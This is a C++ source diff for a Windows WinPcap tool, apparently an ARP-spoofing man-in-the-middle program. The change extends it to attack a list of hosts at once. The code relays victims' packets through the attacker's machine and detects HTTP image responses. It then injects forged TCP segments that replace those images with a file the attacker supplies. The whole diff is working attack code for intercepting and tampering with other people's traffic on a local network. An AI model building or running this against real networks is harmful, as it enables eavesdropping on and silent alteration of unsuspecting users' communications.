@@ -3,6 +3,9 @@
 #include "global.h"
 
 
+volatile BOOL g_programRunning = TRUE;
+volatile BOOL g_attacking = FALSE;
+
 pcap_if_t* g_deviceList = NULL;
 pcap_if_t* g_adapter = NULL;
 DWORD g_selfIp = 0;
@@ -10,7 +13,10 @@ BYTE g_selfMac[6] = {};
 DWORD g_selfGateway = 0;
 BYTE g_gatewayMac[6] = {};
 
-map<DWORD, BYTE[6]> g_host;
+map<DWORD, HostInfoSetting> g_host;
+map<DWORD, HostInfoSetting*> g_attackList;
+map<DWORD64, HostInfoSetting*> g_attackListMac;
+CCriticalSection g_hostAttackListLock;
 
 
 BOOL inputIp(LPCSTR src, DWORD& dest)
@@ -40,20 +46,23 @@ BOOL GetAdapterHandle(pcap_t*& adapter)
 	return TRUE;
 }
 
-
-struct HttpImageLink
+void SetFilter(pcap_t* adapter, LPCSTR exp)
 {
-	WORD sourcePort;
-	BYTE* initPacket;
-	DWORD initPacketLen;
-};
-static map<WORD, HttpImageLink> g_httpImageLink; // target port -> HttpImageLink
-static CCriticalSection g_httpImageLinkLock;
-static BYTE* g_imageData = NULL;
-static CCriticalSection g_imageDataLock;
-static DWORD g_imageDataLen;
+	ULONG netmask = g_adapter->addresses == NULL ? 0x00FFFFFF : ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
+	bpf_program fcode;
+	pcap_compile(adapter, &fcode, exp, 1, netmask);
+	pcap_setfilter(adapter, &fcode);
+}
 
-static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
+DWORD64 BMacToDw64(const BYTE* mac)
+{
+	return *(DWORD64*)mac & 0x0000FFFFFFFFFFFFLL;
+}
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+// param : { ip, port }
+static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 {
 	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
 	pcap_t* adapter;
@@ -61,13 +70,15 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 		return 0;
 
 	// get infomation
-	DWORD targetIp = (DWORD)thiz->m_hostList.GetItemDataPtr(thiz->m_hostList.GetCurSel());
-	BYTE targetMac[6];
-	MoveMemory(targetMac, g_host[targetIp], 6);
-	WORD targetPort = (WORD)_targetPort;
-	g_httpImageLinkLock.Lock();
-	HttpImageLink& link = g_httpImageLink[targetPort];
-	g_httpImageLinkLock.Unlock();
+	DWORD targetIp = ((DWORD*)param)[0];
+	WORD targetPort = (WORD)((DWORD*)param)[1];
+	delete param;
+	g_hostAttackListLock.Lock();
+	HostInfoSetting& target = g_host[targetIp];
+	g_hostAttackListLock.Unlock();
+	target.httpImageLinkLock.Lock();
+	auto& link = target.httpImageLink[targetPort];
+	target.httpImageLinkLock.Unlock();
 	IPPacket* pInitIp = (IPPacket*)&link.initPacket[ETH_LENGTH];
 	DWORD ipLen = pInitIp->headerLen * 4;
 	TCPPacket* pInitTcp = (TCPPacket*)&link.initPacket[ETH_LENGTH + ipLen];
@@ -75,6 +86,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 
 
 	// receive image, you can write it to a file
+#pragma region
 	{
 	BYTE* ackPkt = new BYTE[ETH_LENGTH + ipLen + tcpLen];
 	MoveMemory(ackPkt, g_gatewayMac, 6);
@@ -96,14 +108,10 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
 	pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket) + sizeof(TCPPacket));
 
-	ULONG netmask = 0x00FFFFFF;
-	if (g_adapter->addresses != NULL)
-		netmask = ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
 	CString exp;
-	exp.Format("ip and tcp dst port %u", ntohs(targetPort));
-	bpf_program fcode;
-	pcap_compile(adapter, &fcode, exp, 1, netmask);
-	pcap_setfilter(adapter, &fcode);
+	BYTE* bIp = (BYTE*)&target.ip;
+	exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
+	SetFilter(adapter, exp);
 	DWORD time = GetTickCount();
 	pcap_pkthdr* header;
 	const BYTE* pkt_data;
@@ -131,6 +139,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 	}
 	delete ackPkt;
 	}
+#pragma endregion
 
 
 	// send image
@@ -144,8 +153,8 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 	LPCSTR pContentLen = strstr(pHttp, "Content-Length: ") + strlen("Content-Length: ");
 	DWORD httpHeaderLen = strstr(pHttp, "\r\n\r\n") + strlen("\r\n\r\n") - pHttp;
 
-	MoveMemory(sendBuf, targetMac, 6);					// destination MAC
-	MoveMemory(&sendBuf[6], g_selfMac, 6);				// source MAC
+	MoveMemory(sendBuf, target.mac, 6);					// destination MAC
+	MoveMemory(sendBuf + 6, g_selfMac, 6);				// source MAC
 
 	BYTE* p1 = sendBuf + 12;
 	const BYTE* p2 = link.initPacket + 12;
@@ -164,7 +173,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 		MoveMemory(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
-		_itoa_s(g_imageDataLen, (LPSTR)p1, 15, 10);			// content length
+		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
 		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
 	}
 	else
@@ -173,7 +182,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 		MoveMemory(p1, p2, len);							// data
 		p1 += len; p2 += len;
 
-		_itoa_s(g_imageDataLen, (LPSTR)p1, 15, 10);			// content length
+		_itoa_s(target.imageDataLen, (LPSTR)p1, 15, 10);	// content length
 		for (; *(LPCSTR)p1 != '\0'; p1++); p2 = (BYTE*)strstr((LPCSTR)p2, "\r");
 
 		len = (BYTE*)pContentType - p2;
@@ -208,31 +217,31 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 	pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
 	pIp->CalcCheckSum();											// IP checksum
 	DWORD start;
-	for (start = 0; start + maxTcpDataLen < g_imageDataLen - 1; start += maxTcpDataLen)
+	for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
 	{
-		g_imageDataLock.Lock();
-		if (g_imageData == NULL)
+		target.imageDataLock.Lock();
+		if (target.imageData == NULL)
 		{
-			g_imageDataLock.Unlock();
+			target.imageDataLock.Unlock();
 			goto End;
 		}
-		MoveMemory(pTcpData, (BYTE*)&g_imageData[start], maxTcpDataLen);
-		g_imageDataLock.Unlock();
+		MoveMemory(pTcpData, &target.imageData[start], maxTcpDataLen);
+		target.imageDataLock.Unlock();
 		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
 		pcap_sendpacket(adapter, (u_char*)sendBuf, sendBufLen);
 		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
 	}
 
 	// last packet
-	DWORD lastTcpDataLen = g_imageDataLen - start;
-	g_imageDataLock.Lock();
-	if (g_imageData == NULL)
+	DWORD lastTcpDataLen = target.imageDataLen - start;
+	target.imageDataLock.Lock();
+	if (target.imageData == NULL)
 	{
-		g_imageDataLock.Unlock();
+		target.imageDataLock.Unlock();
 		goto End;
 	}
-	MoveMemory(pTcpData, &g_imageData[start], lastTcpDataLen);
-	g_imageDataLock.Unlock();
+	MoveMemory(pTcpData, &target.imageData[start], lastTcpDataLen);
+	target.imageDataLock.Unlock();
 	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
 	pIp->CalcCheckSum();															// IP checksum
 	pTcp->psh = 1;
@@ -243,167 +252,144 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID _targetPort)
 
 	// release
 End:
-	delete link.initPacket;
 	delete sendBuf;
 	pcap_close(adapter);
-	g_httpImageLinkLock.Lock();
-	g_httpImageLink.erase(targetPort);
-	g_httpImageLinkLock.Unlock();
+	target.httpImageLinkLock.Lock();
+	target.httpImageLink.erase(targetPort);
+	target.httpImageLinkLock.Unlock();
 	return 0;
 }
 
-UINT AFX_CDECL PacketHandleThread(LPVOID flag)
+UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 {
-	CARPTestDlg* thiz = (CARPTestDlg*)AfxGetApp()->m_pMainWnd;
+	CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
 	pcap_t* adapter;
 	if (!GetAdapterHandle(adapter))
 		return 0;
 
-	// get infomation
-	DWORD targetIp = (DWORD)thiz->m_hostList.GetItemDataPtr(thiz->m_hostList.GetCurSel());
-	BYTE targetMac[6], gatewayMac[6];
-	MoveMemory(targetMac, g_host[targetIp], 6);
-	MoveMemory(gatewayMac, g_gatewayMac, 6);
-
-	// read image
-	CString imagePath;
-	thiz->m_imagePathEdit.GetWindowText(imagePath);
-	if (imagePath != "")
-	{
-		CFile f;
-		if (f.Open(imagePath, CFile::modeRead | CFile::typeBinary))
-		{
-			g_imageDataLen = (DWORD)f.GetLength();
-			g_imageData = new BYTE[g_imageDataLen];
-			f.Read((BYTE*)g_imageData, g_imageDataLen);
-		}
-		else
-			MessageBox(NULL, "Failed to load the image.", "", MB_OK);
-	}
-
 	// start capture
-	ULONG netmask = 0x00FFFFFF;
-	if (g_adapter->addresses != NULL)
-		netmask = ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
 	CString exp;
-	BYTE* bIp = (BYTE*)&targetIp;
-	exp.Format("ip host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
-	bpf_program fcode;
-	pcap_compile(adapter, &fcode, exp, 1, netmask);
-	pcap_setfilter(adapter, &fcode);
+	BYTE* bIp = (BYTE*)&g_selfIp;
+	exp.Format("not host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
+	SetFilter(adapter, exp);
 	pcap_pkthdr* header;
 	const BYTE* pkt_data;
 	int res;
-	DWORD send = 0, receive = 0;
-	while (*(BOOL*)flag && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
+	while (g_attacking && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
 	{
 		if (res == 0) // timeout
 			continue;
-		if (memcmp(pkt_data + 6, targetMac, 6) == 0) // is target packet
+
+		{
+		g_hostAttackListLock.Lock();
+		auto targetIt = g_attackListMac.find(BMacToDw64(pkt_data + 6));
+		g_hostAttackListLock.Unlock();
+		if (targetIt != g_attackListMac.end()) // is target packet
 #pragma region
 		{
-			CString status;
-			status.Format("send %u, receive %u", ++send, receive);
-			thiz->m_statusStatic.SetWindowText(status);
+			HostInfoSetting& target = *targetIt->second;
+			target.send++;
 
-			if (thiz->m_forwardCheck.GetCheck())
+			if (target.forward)
 			{
 				// check if is replacing
 				IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
 				if (pIp->protocol == PROTOCOL_TCP)
 				{
 					TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
-					g_httpImageLinkLock.Lock();
-					if (g_httpImageLink.find(pTcp->sourcePort) != g_httpImageLink.end())
+					target.httpImageLinkLock.Lock();
+					if (target.httpImageLink.find(pTcp->sourcePort) != target.httpImageLink.end())
 					{
-						g_httpImageLinkLock.Unlock();
+						target.httpImageLinkLock.Unlock();
 						continue;
 					}
-					g_httpImageLinkLock.Unlock();
+					target.httpImageLinkLock.Unlock();
 				}
 
-				//Sleep(5);
 				BYTE* newData = new BYTE[header->len];
-				MoveMemory(newData, gatewayMac, 6); // destination MAC
-				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
-				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
+				MoveMemory(newData, g_gatewayMac, 6); // destination MAC
+				MoveMemory(newData + 6, g_selfMac, 6); // source MAC
+				MoveMemory(newData + 12, pkt_data + 12, header->len - 12); // data
 				pcap_sendpacket(adapter, (u_char*)newData, header->len);
 				delete newData;
 			}
+			continue;
 		}
 #pragma endregion
-		else if (memcmp(pkt_data + 6, g_gatewayMac, 6) == 0 // is gateway packet
+		}
+
+		if (memcmp(pkt_data + 6, g_gatewayMac, 6) == 0 // is gateway packet
 			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
 #pragma region
 		{
-			CString status;
-			status.Format("send %u, receive %u", send, ++receive);
-			thiz->m_statusStatic.SetWindowText(status);
-
 			IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
-			if (pIp->protocol == PROTOCOL_TCP) // TCP
+			g_hostAttackListLock.Lock();
+			auto targetIt = g_attackList.find(pIp->destinationIp);
+			g_hostAttackListLock.Unlock();
+			if (targetIt == g_attackList.end()) // not to target
+				continue;
+			HostInfoSetting& target = *targetIt->second;
+			target.receive++;
+
+			if (pIp->protocol != PROTOCOL_TCP) // not TCP
+				goto Forward;
+			DWORD ipLength = pIp->headerLen * 4;
+			TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
+
+			if (!target.replaceImages || target.imageData == NULL) // no replacing
+				goto Forward;
+
+			// is replacing
+			target.httpImageLinkLock.Lock();
+			if (target.httpImageLink.find(pTcp->destinationPort) != target.httpImageLink.end())
 			{
-				// no replacing
-				if (!thiz->m_replaceImagesCheck.GetCheck() || g_imageData == NULL)
-					goto Forward;
-
-				DWORD ipLength = pIp->headerLen * 4;
-				TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
-				// is replacing
-				g_httpImageLinkLock.Lock();
-				if (g_httpImageLink.find(pTcp->destinationPort) != g_httpImageLink.end())
-				{
-					g_httpImageLinkLock.Unlock();
-					continue;
-				}
-				g_httpImageLinkLock.Unlock();
-
-				DWORD tcpLength = pTcp->headerLen * 4;
-				// not HTTP
-				if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
-					goto Forward;
-
-				LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
-				LPCSTR contentType = strstr(http, "Content-Type: image/");
-				// not image
-				if (contentType == NULL)
-					goto Forward;
-
-				
-				// replace image
-				g_httpImageLinkLock.Lock();
-				HttpImageLink& link = g_httpImageLink[pTcp->destinationPort];
-				g_httpImageLinkLock.Unlock();
-				link.sourcePort = pTcp->sourcePort;
-				link.initPacketLen = header->len;
-				link.initPacket = new BYTE[header->len];
-				MoveMemory(link.initPacket, pkt_data, header->len);
-				AfxBeginThread(ReplaceImageThread, (LPVOID)pTcp->destinationPort);
+				target.httpImageLinkLock.Unlock();
 				continue;
 			}
+			target.httpImageLinkLock.Unlock();
+
+			DWORD tcpLength = pTcp->headerLen * 4;
+			// not HTTP
+			if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
+				goto Forward;
+
+			LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
+			LPCSTR contentType = strstr(http, "Content-Type: image/");
+			// not image
+			if (contentType == NULL)
+				goto Forward;
+
+				
+			// replace image
+			target.httpImageLinkLock.Lock();
+			auto& link = target.httpImageLink[pTcp->destinationPort];
+			target.httpImageLinkLock.Unlock();
+			link.sourcePort = pTcp->sourcePort;
+			link.initPacketLen = header->len;
+			link.initPacket = new BYTE[header->len];
+			MoveMemory(link.initPacket, pkt_data, header->len);
+			DWORD* param = new DWORD[2];
+			param[0] = target.ip;
+			param[1] = pTcp->destinationPort;
+			AfxBeginThread(ReplaceImageThread, (LPVOID)param);
+			continue;
 			
 Forward:
-			if (thiz->m_forwardCheck.GetCheck())
+			if (target.forward)
 			{
 				BYTE* newData = new BYTE[header->len];
-				MoveMemory(newData, targetMac, 6); // destination MAC
-				MoveMemory(&newData[6], g_selfMac, 6); // source MAC
-				MoveMemory(&newData[12], &pkt_data[12], header->len - 12); // data
+				MoveMemory(newData, target.mac, 6); // destination MAC
+				MoveMemory(newData + 6, g_selfMac, 6); // source MAC
+				MoveMemory(newData + 12, pkt_data + 12, header->len - 12); // data
 				pcap_sendpacket(adapter, (u_char*)newData, header->len);
 				delete newData;
 			}
+			continue;
 		}
 #pragma endregion
 	}
 
 	// release
-	g_imageDataLock.Lock();
-	if (g_imageData != NULL)
-	{
-		delete g_imageData;
-		g_imageData = NULL;
-	}
-	g_imageDataLock.Unlock();
 	pcap_close(adapter);
 	return 0;
 }
